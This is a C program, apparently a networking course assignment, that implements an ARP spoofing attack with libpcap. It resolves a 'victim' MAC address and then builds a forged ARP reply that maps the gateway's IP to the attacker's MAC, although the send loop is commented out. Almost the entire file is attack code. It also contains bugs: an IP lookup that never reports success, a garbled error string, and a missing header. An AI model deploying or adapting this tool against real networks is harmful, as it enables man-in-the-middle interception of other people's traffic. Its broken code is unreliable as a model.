#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <memory.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>

// Parameter Flag
#define IN
#define OUT

// Ethernet Constants
#define ETHERNET_TYPE_ARP 0x0806

// ARP Constants
#define ARP_HARDWARE_TYPE_ETHERNET   0x01
#define ARP_PROTOCOL_TYPE_IP         0x0800
#define ARP_HARDWARE_LENGTH_ETHERNET 0x06
#define ARP_PROTOCOL_LENGTH_IP       0x04
#define ARP_OPERATION_REQUEST        0x01
#define ARP_OPERATION_REPLY          0x02
#define RARP_OPERATION_REQUEST       0x03
#define RARP_OPERATION_REPLY         0x04

// Ethernet Header Structure (14 bytes)
typedef struct _ethernetHeader {
    uint8_t  destinationMac[6];
    uint8_t  sourceMac[6];
    uint16_t type;
} ethernetHeader;

// ARP Packet Structure
typedef struct _arpStructure {
    uint16_t hardwareType;
    uint16_t protocolType;
    uint8_t  hardwareLength;
    uint8_t  protocolLength;
    uint16_t operationCode;
    uint8_t  sourceHardwareAddress[ARP_HARDWARE_LENGTH_ETHERNET];
    uint8_t  sourceProtocolAddress[ARP_PROTOCOL_LENGTH_IP];
    uint8_t  destinationHardwareAddress[ARP_HARDWARE_LENGTH_ETHERNET];
    uint8_t  destinationProtocolAddress[ARP_PROTOCOL_LENGTH_IP];
} arpStructure;

// Print MAC Address in Ethernet Packet
void printMacAddress(const char *prefix, uint8_t *macAddress) {
    printf("%s[%02x:%02x:%02x:%02x:%02x:%02x]\n", prefix, 
        macAddress[0], macAddress[1], macAddress[2],
        macAddress[3], macAddress[4], macAddress[5]);
}

// Print IP Address
void printIpAddress(const char *prefix, uint8_t *ipAddress) {
    printf("%s[%d.%d.%d.%d]\n", prefix, 
        ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
}

// Print Usage
void usage() {
    printf("syntax: pcap_test <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int getMacAddress(IN char *interfaceName, OUT uint8_t *macAddress) {
    struct ifreq interfaceRequest;
    int ret = EXIT_FAILURE;
    int fileDescriptor;
    
    if((fileDescriptor = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0) {
        fprintf(stderr, "socket error!\n");
        goto end;
    }

    strncpy(interfaceRequest.ifr_name, interfaceName, IFNAMSIZ-1);
    ioctl(fileDescriptor, SIOCGIFHWADDR, &interfaceRequest);

    memcpy(macAddress, interfaceRequest.ifr_hwaddr.sa_data, ARP_HARDWARE_LENGTH_ETHERNET);

    ret = EXIT_SUCCESS;
end:
    if(fileDescriptor) {
        close(fileDescriptor);
    }

    return ret;
}

int getIpAddress(IN char *interfaceName, OUT uint8_t *ipAddress) {
    struct ifreq interfaceRequest;
    int ret = EXIT_FAILURE;
    int fileDescriptor;

    if((fileDescriptor = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0) {
        fprintf(stderr, "socket error!\n");
        goto end;
    }

    strncpy(interfaceRequest.ifr_name, interfaceName, IFNAMSIZ-1);
    ioctl(fileDescriptor, SIOCGIFADDR, &interfaceRequest);

    memcpy(ipAddress, 
        &(((struct sockaddr_in *)&interfaceRequest.ifr_addr)->sin_addr), 
        ARP_PROTOCOL_LENGTH_IP);

end:
    if(fileDescriptor) {
        close(fileDescriptor);
    }

    return ret;
}

void printArpPacketInfo(IN arpStructure arpPacket) {
    printMacAddress("  - Source      MAC Address : ", (uint8_t *)arpPacket.sourceHardwareAddress);
    printMacAddress("  - Destination MAC Address : ", (uint8_t *)arpPacket.destinationHardwareAddress);
    printIpAddress( "  - Source      IP  Address : ", (uint8_t *)arpPacket.sourceProtocolAddress);
    printIpAddress( "  - Destination IP  Address : ", (uint8_t *)arpPacket.destinationProtocolAddress);
}

void receiveArpPacket(IN pcap_t *handle, IN uint8_t *macAddress, OUT arpStructure *receivedArpPacket) {
    arpStructure *arpPacket = NULL;

    // packet parsing
    while (!arpPacket) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        // end skeleton code

        // parse Ethernet in Datalink Layer
        ethernetHeader *ethernetPacket = (ethernetHeader *)packet;

        switch(ntohs(ethernetPacket->type)) {
            case ETHERNET_TYPE_ARP: // value is 0x0806
                if(!memcmp(ethernetPacket->destinationMac, macAddress, ARP_HARDWARE_LENGTH_ETHERNET)) { 
                    arpPacket = (arpStructure *)(packet + sizeof(ethernetHeader));

                    // Print Ethernet Packet
                    printf("[*] Ethernet Information\n");
                    printMacAddress("  - Dest MAC : ", ethernetPacket->destinationMac);
                    printMacAddress("  - Src  MAC : ", ethernetPacket->sourceMac);
                    printf("  - Type     : [%04x]",  ntohs(ethernetPacket->type));

                    printf("\n");

                    // Print ARP Packet
                    printf("[*] ARP Information\n");
                    printArpPacketInfo(*arpPacket);
                    memcpy(receivedArpPacket, arpPacket, sizeof(arpStructure));
                }
                break;
            default:
                break;
        }
        printf("\n");
    }
}

int getVictimMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIpAddress, OUT uint8_t *victimMacAddress) {
    int ret = EXIT_FAILURE;
    struct in_addr laddr;
    uint8_t buf[sizeof(ethernetHeader) + sizeof(arpStructure)];
    arpStructure receivedArpPacket;

    // Initialize Ethernet Packet
    ethernetHeader ethernetPacket;

    // set source MAC Address for Ethernet
    if(getMacAddress(interfaceName, ethernetPacket.sourceMac) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address for Ethernet
    memset(ethernetPacket.destinationMac, 0xFF, ARP_HARDWARE_LENGTH_ETHERNET);

    // set Ethernet Type
    ethernetPacket.type = htons(ETHERNET_TYPE_ARP);

    // Initialize ARP Packet
    arpStructure arpPacket;
    arpPacket.hardwareType   = htons(ARP_HARDWARE_TYPE_ETHERNET);
    arpPacket.protocolType   = htons(ARP_PROTOCOL_TYPE_IP);
    arpPacket.hardwareLength = ARP_HARDWARE_LENGTH_ETHERNET;
    arpPacket.protocolLength = ARP_PROTOCOL_LENGTH_IP;
    arpPacket.operationCode  = htons(ARP_OPERATION_REQUEST);

    // set source MAC Address for ARP
    if(getMacAddress(interfaceName, arpPacket.sourceHardwareAddress) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address
    memset(arpPacket.destinationHardwareAddress, 0x00, ARP_HARDWARE_LENGTH_ETHERNET);

    // set source IP Address 
    if(getIpAddress(interfaceName, arpPacket.sourceProtocolAddress) < 0) {
        fprintf(stderr, "Get IP Address Failed!\n");
        goto end;
    }

    // set destination IP Address 
    if(inet_aton(victimIpAddress, &laddr) < 0) {
        fprintf(stderr, "IP Address Format Invalid!\n");
        goto end;
    }
    memcpy(&arpPacket.destinationProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);

    // assemble Packet
    memcpy(buf, &ethernetPacket, sizeof(ethernetHeader));
    memcpy(buf + sizeof(ethernetHeader), &arpPacket, sizeof(arpStructure));

    printf("[+] Initialize\n");
    printArpPacketInfo(arpPacket);
    printf("\n");

    printf("[*] Send ARP Packet\n");
    if(pcap_sendpacket(handle, buf, sizeof(buf))) {
        fprintf(stderr, "Send ARP Packet Error!\n");
        goto end;   
    }
    printf("\n");

    printf("[+] Get MAC Address\n");
    receiveArpPacket(handle, ethernetPacket.sourceMac, &receivedArpPacket);
    if(!receivedArpPacket.sourceHardwareAddress) {
        fprintf(stderr, "Receive ARP Packet Error!\n");
        goto end;
    }
    memcpy(victimMacAddress, receivedArpPacket.sourceHardwareAddress, ARP_HARDWARE_LENGTH_ETHERNET);
    
    ret = EXIT_SUCCESS;

end:
    return ret;
}

int spoofMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIpAddress, IN char *gatewayIpAddress, IN uint8_t *victimMacAddress) {
    int ret = EXIT_FAILURE;
    struct in_addr laddr;
    uint8_t buf[sizeof(ethernetHeader) + sizeof(arpStructure)];
    arpStructure receivedArpPacket;

    // Initialize Ethernet Packet
    ethernetHeader ethernetPacket;

    // set source MAC Address for Ethernet
    if(getMacAddress(interfaceName, ethernetPacket.sourceMac) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address for Ethernet
    memcpy(ethernetPacket.destinationMac, victimMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set Ethernet Type
    ethernetPacket.type = htons(ETHERNET_TYPE_ARP);

    // Initialize ARP Packet
    arpStructure arpPacket;
    arpPacket.hardwareType   = htons(ARP_HARDWARE_TYPE_ETHERNET);
    arpPacket.protocolType   = htons(ARP_PROTOCOL_TYPE_IP);
    arpPacket.hardwareLength = ARP_HARDWARE_LENGTH_ETHERNET;
    arpPacket.protocolLength = ARP_PROTOCOL_LENGTH_IP;
    arpPacket.operationCode  = htons(ARP_OPERATION_REPLY);

    // set source MAC Address for ARP
    if(getMacAddress(interfaceName, arpPacket.sourceHardwareAddress) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address
    memcpy(arpPacket.destinationHardwareAddress, victimMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set source IP Address 
    if(inet_aton(gatewayIpAddress, &laddr) < 0) {
        fprintf(stderr, "IP Address Format Invalid!\n");
        goto end;
    }
    memcpy(&arpPacket.sourceProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);

    // set destination IP Address 
    if(inet_aton(victimIpAddress, &laddr) < 0) {
        fprintf(stderr, "IP Address Format Invalid!\n");
        goto end;
    }
    memcpy(&arpPacket.destinationProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);

    // Assemble Packet
    memcpy(buf, &ethernetPacket, sizeof(ethernetHeader));
    memcpy(buf + sizeof(ethernetHeader), &arpPacket, sizeof(arpStructure));

    printf("[+] Initialize\n");
    printArpPacketInfo(arpPacket);
    printf("\n");

    /*
    while(true) {
        printf("[*] Send ARP Packet...\n");
        if(pcap_sendpacket(handle, buf, sizeof(buf))) {
            fprintf(stderr, "Send ARP Packet Error!\n");
            goto end;   
        }
        printf("\n");
    }
    */

    ret = EXIT_SUCCESS;

end:
    return ret;
}

// Main Function
int main(int argc, char* argv[]) {
    int ret = EXIT_FAILURE;
    pcap_t *handle = NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    uint8_t macAddress[ARP_HARDWARE_LENGTH_ETHERNET];

    // require arguments
    if (argc != 4) {
        usage();
        goto end;
    }

    // get packet using pcap library
    if(!(handle = pcap_open_live(argv[1], BUFSIZ, 1, 1024, errbuf))) {
        fprintf(stderr, "couldn't open devicnetinet/if_ether.he %s: %s\n", argv[1], errbuf);
        goto end;
    }

    // Get Victim MAC Address
    printf("[*] 1. Get Victim MAC Address\n");
    getVictimMacAddress(handle, argv[1], argv[2], macAddress);
    printMacAddress("[*] Victim MAC Address : ", macAddress);
    printf("\n\n");

    // Spoofing MAC Address
    printf("[*] 2. ARP Spoofing\n");
    spoofMacAddress(handle, argv[1], argv[2], argv[3], macAddress);
    
    ret = EXIT_SUCCESS; 

end:
    if(handle) {
        pcap_close(handle);
    }
    return ret;
}
